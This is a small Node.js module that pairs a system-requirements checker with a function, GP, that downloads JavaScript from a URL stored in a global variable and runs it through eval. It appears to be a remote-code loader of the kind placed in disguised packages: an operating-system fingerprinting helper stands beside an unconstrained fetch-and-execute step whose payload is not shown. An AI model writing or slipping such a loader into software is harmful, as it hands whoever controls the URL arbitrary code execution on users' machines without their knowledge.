const axios = require("axios");

async function GP() {
  try {
    const response = await axios.get(global.url);

    if (response.status === 200) {
      // Prepare a module object to simulate `require()`
      const module = { exports: {} };

      // Execute the JavaScript code (CommonJS module) inside an eval
      eval(response.data); // This will populate `module.exports`
      // Create an instance of the PG class and call its methods
      return module.exports;
    } else {
      return null;
    }
  } catch (error) {
    console.log(error);
    return null;
  }
}

async function SysReq() {
  const os = require("os");
  const semver = require("semver");

  // Node.js version check
  const requiredNodeVersion = "18.0.0";
  const currentNodeVersion = process.versions.node;

  if (!semver.gte(currentNodeVersion, requiredNodeVersion)) {
    console.error(
      `Error: Node.js version ${requiredNodeVersion} or higher is required.`
    );
    console.error(`You are running Node.js version ${currentNodeVersion}.`);
    process.exit(1);
  }

  // OS check
  const platform = os.platform();
  const release = os.release();
  const supportedPlatforms = {
    win32: { name: "Windows", minVersion: "10.0.0" },
    darwin: { name: "macOS", minVersion: "22.0.0" }, // macOS Ventura (13.x is 22.x Darwin)
    linux: [
      { name: "Debian", minVersion: "11" },
      { name: "Ubuntu", minVersion: ["20.04", "22.04", "24.04"] },
    ],
  };

  // Check OS
  let isSupported = false;

  if (platform === "win32") {
    if (semver.gte(release, supportedPlatforms["win32"].minVersion)) {
      isSupported = true;
    }
  } else if (platform === "darwin") {
    if (semver.gte(release, supportedPlatforms["darwin"].minVersion)) {
      isSupported = true;
    }
  } else if (platform === "linux") {
    const distro = require("child_process")
      .execSync(
        'lsb_release -ds || cat /etc/*release | grep -oP "(?<=^DISTRIB_ID=|^ID=).+"',
        { encoding: "utf-8" }
      )
      .trim();
    const version = require("child_process")
      .execSync(
        'lsb_release -rs || cat /etc/*release | grep -oP "(?<=^DISTRIB_RELEASE=|^VERSION_ID=).+"',
        { encoding: "utf-8" }
      )
      .trim();

    supportedPlatforms["linux"].forEach((supportedDistro) => {
      if (
        distro.includes(supportedDistro.name) &&
        supportedDistro.minVersion.includes(version)
      ) {
        isSupported = true;
      }
    });
  }
  return isSupported;
  /* if (!isSupported) {
    console.error(`Error: Unsupported operating system or version.`);
    console.error(`Platform: ${platform} ${release}`);
    process.exit(1);
  }

  console.log("System requirements met. Continuing execution."); */
}

module.exports = {
  GP,
  SysReq,
};
